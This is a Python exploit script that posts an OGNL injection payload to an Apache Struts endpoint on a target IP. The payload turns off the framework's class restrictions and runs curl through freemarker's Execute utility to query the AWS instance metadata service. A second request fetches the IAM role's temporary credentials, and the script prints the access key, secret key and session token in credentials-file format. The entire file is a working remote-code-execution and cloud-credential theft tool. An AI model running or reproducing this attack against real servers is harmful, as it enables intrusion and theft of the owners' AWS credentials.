import requests
from bs4 import BeautifulSoup
import json
import sys

#ip = input("Please enter server IP Address: ")
ip = str(sys.argv[1])

url = 'http://' + ip + ':' + '8080' + '/index.action'

data = {
    "id": '%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("curl http://169.254.169.254/latest/meta-data/iam/security-credentials/")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}'
}
res = requests.post(url, data=data)
data = res.text
soup = BeautifulSoup(data, 'html.parser')
for link in soup.find_all('a'):
    role = link.get('id')

data2 = {
    "id": '%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("curl http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role + '"' + ')).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}'
}

res = requests.post(url, data=data2)
dataaa = res.text
soup = BeautifulSoup(dataaa, 'html.parser')
for link in soup.find_all('a'):
    keys = link.get('id')

json_key = json.loads(keys)
print("[default]")
print("aws_access_key_id = ", json_key['AccessKeyId'])
print("aws_secret_access_key = ", json_key['SecretAccessKey'])
print("aws_session_token = ", json_key['Token'])